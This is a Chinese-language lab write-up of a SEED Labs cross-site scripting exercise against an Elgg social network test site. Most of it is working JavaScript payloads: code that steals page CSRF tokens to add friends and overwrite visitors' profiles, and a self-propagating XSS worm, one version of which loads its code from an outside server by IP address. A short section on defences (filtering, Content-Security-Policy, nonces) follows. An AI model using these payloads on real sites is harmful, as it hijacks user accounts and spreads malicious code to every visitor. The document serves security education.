#
#### xss攻击初试

登陆用户(Boby)后在编辑个人资料的brief description的输入框中`<script>alert("xss");<script>`  

![](/web-security/img/xss-2.png)

![](/web-security/img/xss-3.png)

可以看到成功，只要有人访问Boby主页就会弹出'xss'的信息,也证明了这个输入框存在xss漏洞  


#### 通过xss成为他人的好友

当其他人浏览器Boby的主页时，注入的代码被触发，自动发送一个添加为Boby为好友的请求  


首先查看添加一个好友时的请求，
![](/web-security/img/xss-4.png)

```
http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1630823966&__elgg_token=R4VM1t8Ve2BxQwD3elcphg&__elgg_ts=1630823966&__elgg_token=R4VM1t8Ve2BxQwD3elcphg&logged_in=true
```
friend是用户的id  
__elgg_ts和__elgg_token是对应csrf的，这两个参数的值和具体的页面有关，因此js不能硬编码这两个值，需要在运行期间找到正确的值。  
cookie 会被浏览器自动设置，攻击者不需要担心这个字段，但是攻击者想要读取这个cookie值也是允许的，因为注入js代码确实来值当前页面。而在csrf攻击中，攻击者的代码来自第三方页面，因此不能访问当前页面的cookie  

由于__elgg_ts和__elgg_token是嵌入在页面里的，可以通过google浏览器右键查看网页源代码。可以找到如下代码
```
var elgg = {"config":{"lastcache":1587931381,"viewtype":"default","simplecache_enabled":1,"current_language":"en"},"security":{"token":{"__elgg_ts":1630825474,"__elgg_token":"gLI3JjeMwAhlKcagQO1jwA"}},"session":{"user":{"guid":57,"type":"user","subtype":"user","owner_guid":57,"container_guid":0,"time_created":"2020-04-26T15:22:48-04:00","time_updated":"2021-09-05T01:02:20-04:00","url":"http:\/\/www.seed-server.com\/profile\/boby","name":"Boby","username":"boby","language":"en","admin":false},"token":"0Os8m0A3xOBH6IkolTk19q"},"_data":{},"page_owner":{"guid":59,"type":"user","subtype":"user","owner_guid":59,"container_guid":0,"time_created":"2020-04-26T15:23:51-04:00","time_updated":"2020-04-26T15:23:51-04:00","url":"http:\/\/www.seed-server.com\/profile\/samy","name":"Samy","username":"samy","language":"en"}};
```
所以这个两个变量可以通过 elgg.security.token.__elgg_ts和elgg.security.token.__elgg_token两个js变量获得。  
boby的用户id是57   


构造一个请求，可以通过ajax，ajax可以在后台发送http请求不引起用户的警觉。把这段js代码还是放到个人信息的输入框中保存  
```
<script type="text/javascript">
window.onload = function() {
  var Ajax = null;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;

  var sendurl = "http://www.seed-server.com/action/friends/add" 
                + "?friend=57" + token + ts;

  Ajax = new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
}
</script>
```

下面登陆一个 alice的账号
![](/web-security/img/xss-5.png)
![](/web-security/img/xss-6.png)
![](/web-security/img/xss-7.png)

可以看到当请求了Members的页面后，好友就自动被添加了。  


#### 使用xss修改他人的主页 
这个与添加好友的方式类似，首先知道编辑个人资料的url和参数。这次攻击修改briefdescription字段

还是浏览器右键检查查看  
```
Request URL: http://www.seed-server.com/action/profile/edit
Request Method: POST
Status Code: 302 Found
Remote Address: 10.9.0.5:80
Referrer Policy: strict-origin-when-cross-origin
Cache-Control: must-revalidate, no-cache, no-store, private
Connection: Keep-Alive
Content-Length: 402
Content-Type: text/html; charset=UTF-8
Date: Sun, 05 Sep 2021 07:46:17 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=99
Location: http://www.seed-server.com/profile/boby
pragma: no-cache
Server: Apache/2.4.41 (Ubuntu)
Vary: User-Agent
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 2516
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryseBZpNI0D8wsIOAA
Cookie: PHPSESSID=ma8nvssnsq9u9d24fgi54lvts4; Elgg=8u09s0eijn1mid4f5j6bkpll9g
Host: www.seed-server.com
Origin: http://www.seed-server.com
Referer: http://www.seed-server.com/profile/boby/edit
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36
__elgg_token: Z7sVhbouFLawsOiQSx6HHg
__elgg_ts: 1630827973
name: Boby
description: 
accesslevel[description]: 2
briefdescription: aaa
accesslevel[briefdescription]: 2
location: 
accesslevel[location]: 2
interests: 
accesslevel[interests]: 2
skills: 
accesslevel[skills]: 2
contactemail: 
accesslevel[contactemail]: 2
phone: 
accesslevel[phone]: 2
mobile: 
accesslevel[mobile]: 2
website: 
accesslevel[website]: 2
twitter: 
accesslevel[twitter]: 2
guid: 57
```

每个字段都有访问等级`accesslevel[briefdescription]: 2`2表示公开
经过查看post请求其实只需要__elgg_token，__elgg_ts，guid，briefdescription，accesslevel[briefdescription]这五个字段
在上面添加好友攻击的时候查看网页源码的时候看到，出了ts和token。guid也可以通过 elgg.session.user.guid获得  


所以构建请求，并且排除掉了自己的guid
```
<script type="text/javascript">
window.onload = function() {
  var Ajax = null;
  var guid = "&guid=" + elgg.session.user.guid;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;
  var name = "&name=" + elgg.session.user.name;
  var desc = "&briefdescription=shanjiaping is 666" + "&accesslevel[briefdescription]=2";

  var sendurl = "http://www.seed-server.com/action/profile/edit";
  var content = token + ts + name + desc + guid;
  if (elgg.session.user.guid != 57){
      var Ajax = null;
      Ajax = new XMLHttpRequest();
      Ajax.open("POST", sendurl, true);
      Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      Ajax.send(content);
  }
}
</script>
```
老样子，把这段js代码放入个人信息的输入框中  

还是登陆alice用户并查看了boby的主页，这是alice的信息就被改变了

![](/web-security/img/xss-8.png)




#### xss蠕虫
之所以被称为蠕虫，是因为可以像蠕虫一样能自传播js代码。  
为了实现这一点，js恶意代码需要得到一个与自身相同的拷贝。可以通过从外部文件获取一份自身程序拷贝，或者完全通过自身实现(这种方法很难，下面还是使用从外部获取的方式来试验)  


**通过DOM方法实现**   
当一个页面加载完后，浏览器会把页面的内容放在一个树的数据机构中，并提供api让js访问和修改树中的数据。   
如果一个页面包含js代码，这个代码也将被储存为树中的一个节点，如果知道包含恶意js代码的dom节点位置，那么就能从这个节点上获取代码。  
为了方便找到节点,我们可以在js代码取一个名字，然后可以通过`document.getElementById()`来找到。  


```
<script id="worm">
    var strCode = document.getElementById("worm").innerHTML;
    alert(strCode);
</script>
```
`document.getElementById("worm").innerHTML`可以获取节点的内部内容，不不过外部的script标签。所以只需要在获取到的内容外部在加上script就能构成完全相同的代码  

通过这个知识，我们来构建一个可以自我传播的xss攻击代码，也就是func中的前四行构造了一个拷贝，然后通过desc拼接，就能把这段恶意代码也放入其他访问者的个人信息中。  
```
<script type="text/javascript" id="worm">
window.onload = function() {
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
  var jsCode = document.getElementById("worm").innerHTML;
  var tailTag = "</" + "script>";

  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
  
  var Ajax = null;
  var guid = "&guid=" + elgg.session.user.guid;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;
  var name = "&name=" + elgg.session.user.name;
  var desc = "&briefdescription=shanjiaping is 666666" + "&accesslevel[briefdescription]=2" + + wormCode;

  var sendurl = "http://www.seed-server.com/action/profile/edit";
  var content = token + ts + name + desc + guid;
  if (elgg.session.user.guid != 57){
      var Ajax = null;
      Ajax = new XMLHttpRequest();
      Ajax.open("POST", sendurl, true);
      Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      Ajax.send(content);
  }
}
</script>
```
老样子，还是把这段恶意代码放入boby的个人信息中。  

![](/web-security/img/xss-9.png)

通过试验，登陆alice访问了boby主页，在登陆admin访问alice主页。发现admin的个人信息也被修改了，说明实现了传播。   


**通过链接方法实现**

这种方式是把js代码放到了外部的url中，通过src链接到页面上。
```
shan@shan-GV62-8RC:~/下载/Labsetup/image_www/csp$ pwd
/home/shan/下载/Labsetup/image_www/csp

shan@shan-GV62-8RC:~/下载/Labsetup/image_www/csp$ vi xssworm.js
```
```
window.onload = function() {
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
  var jsCode = "src=\"http://212.64.56.231/xssworm.js\">";
  var tailTag = "</" + "script>";

  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
  
  var Ajax = null;
  var guid = "&guid=" + elgg.session.user.guid;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;
  var name = "&name=" + elgg.session.user.name;
  var desc = "&briefdescription=shanjiaping is 8888" + "&accesslevel[briefdescription]=2" + + wormCode;

  var sendurl = "http://www.seed-server.com/action/profile/edit";
  var content = token + ts + name + desc + guid;
  if (elgg.session.user.guid != 57){
      var Ajax = null;
      Ajax = new XMLHttpRequest();
      Ajax.open("POST", sendurl, true);
      Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      Ajax.send(content);
  }
}
```

我放在自己服务器的nginx下 通过浏览器查看一下是能访问  
![](/web-security/img/xss-10.png)



现在只需要在boby的个人信息输入框中放入  
```
<script type="text/javascript" id="worm" src="http://212.64.56.231/xssworm.js"></script>
```

通过试验，登陆alice访问了boby主页，在登陆admin访问alice主页。发现admin的个人信息也被修改了，说明实现了传播。  
![](/web-security/img/xss-11.png)



#### 防御方式
xss的根本原因是html允许js代码和数据混编。  

**1.去除代码:**  
过滤掉数据中的代码， 或者通过编码把代码变成数据  
**2.用内容安全策略(CSP,这是一套标准，是为了防御xss攻击，大部分浏览器都实现了):**   
网页中放入js代码两种方式 嵌入式：代码直接在网页中。引入式：把代码放在另外一个文件或url中，包含进网页   
通过CSP，网站可以通过在回复的头部加入一些CSP规则，告诉浏览器不要运行页面中嵌入的任何JavaScript代码， 所有代码都必须从网站单独下载。  
比如csp规则:  
```
Content-Security-Policy: script-src 'self'
```
不仅禁止了所有嵌入式代码，还规定只有来自和该网页同一网站的代码才可以被执行（这是self的意义）。在这个规则下， 引入js必须这样写：  
```
<script src="myscript.js"></script>
```
但有时需要运行从其他可以信任的网站下载的代码，CSP允许提供一个白名单，如：  
```
Content-Security-Policy: script-src 'self' example.com 
                         https://apis.google.com
```


安全地使用嵌入式代码 如果开发者确想用嵌入式的方法把代码放到网页中，CSP也提供了一种安全的做法，就是要求在CSP规则中指明哪些嵌入代码是 可信的。有两种：  
把可信代码的单项哈希值放在CSP规则中  
```
Content-Security-Policy: script-src 'nonce-34fo3er92d'
```

用nonce，在CSP规则中设置一些可信任的nonce  
```
<script nonce="34fo3er92d">...</script>
```


